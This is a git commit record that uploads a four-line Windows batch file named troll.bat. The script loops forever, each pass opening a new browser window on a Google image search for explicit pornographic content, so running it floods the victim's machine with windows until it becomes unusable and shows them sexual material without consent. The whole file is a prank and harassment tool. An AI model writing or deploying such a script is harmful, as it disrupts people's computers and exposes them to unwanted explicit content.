c0974ac1b5be5960eea2a687fb242742dd3d50ee
fixsero <117268495+fixsero@users.noreply.github.com>
2022-11-02 11:16:28 +0100

    Add files via upload

---
+++ troll.bat
@@ -0,0 +1,4 @@
+:x
+start https://www.google.com/search?q=furry-porn&rlz=1C1GCEB_enNO1003NO1003&sxsrf=ALiCzsaY6gYeI3RUPSoYgbK_QD7uVkKRaQ:1652355582236&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjn7pWc8Nn3AhWByYsKHVVVD0sQ_AUoAXoECAEQAw&biw=1600&bih=789&dpr=1
+
+goto x 
